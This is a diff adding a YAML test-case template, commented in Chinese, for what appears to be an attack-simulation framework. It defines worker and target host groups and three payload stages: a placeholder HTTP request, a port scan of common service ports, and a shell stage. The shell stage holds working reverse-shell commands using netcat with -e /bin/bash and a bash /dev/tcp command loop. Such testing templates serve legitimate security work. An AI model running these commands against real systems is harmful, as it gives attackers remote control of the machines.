@@ -1,0 +1,79 @@
+id: XSS-1 # 用例ID
+
+info:
+  name: XSS-1
+  severity: critical
+  tags: xss,zhiqian,web
+  type: web # 用例类型
+  author: zhiqian
+
+rule_info: # 运营中心或secker配置，N*N的关系；agent也用来判断自己是worker还是target的角色
+  targetgroup: 
+    group1: &tg1
+      - Host_name_or_Host_ip1TG1 # 定义目标域名活IP，来自框架变量
+      - Host_name_or_Host_ip2TG1
+    group2: &tg2
+      - Host_name_or_Host_ip1TG2
+      - 10.80.20.12
+  workergroup: &worker
+    10.80.20.12: *tg1
+    Host_name_or_Host_ipW2: *tg2
+
+payload: # payload列表
+  - HTTP: # type: https[http/https/tcp/ssh/ftp/udp/scan] # payload类型，本例是https，也可以是tcp、cmd、scan等
+      worker: # payload投递内容，worker使用
+        protocol: secker://web/https
+        request: 
+          - |
+              GET xxx
+              xxx
+      target: # target使用
+        protocol: secker://package/tomcat@1.3.5 # 引用软件包，去secker下载。软件包是个压缩包，包括二进制文件、配置文件、脚本、签名信息；端口、IP等变量从框架引用，变量引用{{}}
+        request: |
+          ./tomcat --port {{port}} --conf ./config
+          ./watch.sh
+      response: # 响应选项
+        pattern: .*200 OK.* # 匹配响应内容的正则
+      option:
+        redirects: true # 投递选项，每种payload类型不同
+        max-redirects: 3
+        timeout: 50 # 执行超时时间
+        retry: 5 # 重试次数
+      result:
+        on_match_response: 2(index of payload array)/fail # 匹配到响应内容后的动作，可以跳到某个序号的payload执行，或直接失败（跳到fail）
+        on_timeout: fail # 执行超时的动作，可以跳到某个序号的payload执行，或直接完成（跳到done），或直接失败（跳到fail）
+        on_fail: 2
+  - SHELL: # type: cmd[http/https/tcp/ssh/ftp/udp]
+      worker:
+        protocol: secker://shell/cmd
+        request: |
+          nc -e /bin/bash {{host}} {{port}};
+      target: # 端口、IP等变量从框架引用
+        protocol: secker://shell/cmd
+        request: | 
+          exec 5<>/dev/tcp/{{host}}/{{port}};cat <&5|while read line;do $line >&5 2>&1;done
+      options:
+        os_env: xxx
+        timeout: 50
+        retry: 5 # 重试次数
+      result:
+        on_timeout: 2(index of payload array)/fail
+        on_finish: 2(index of payload array)/fail # 执行结束的动作，可以跳到某个序号的payload执行，或直接失败（跳到fail）
+        on_fail: fail # # 执行失败的动作，可以跳到某个序号的payload执行，或直接失败（跳到fail）
+  - SCAN: # type: cmd[http/https/tcp/ssh/ftp/udp]
+      worker:
+        protocol: secker://scan/port
+        request:
+          - |-
+            syn|fin|ack
+          - |+
+            21,22,3306,3389,6379
+      response: # 默认返回pattern匹配到的部分，支持正则分组。如果没有设置pattern则返回整个信息
+        pattern: 3389
+      options:
+        timeout: 50
+        retry: 5 # 重试次数
+      result:
+        on_timeout: 2(index of payload array)/fail
+        on_finish: 2(index of payload array)/fail # 执行结束的动作，可以跳到某个序号的payload执行，或直接失败（跳到fail）
+        on_fail: 1/fail # # 执行失败的动作，可以跳到某个序号的payload执行，或直接失败（跳到fail）
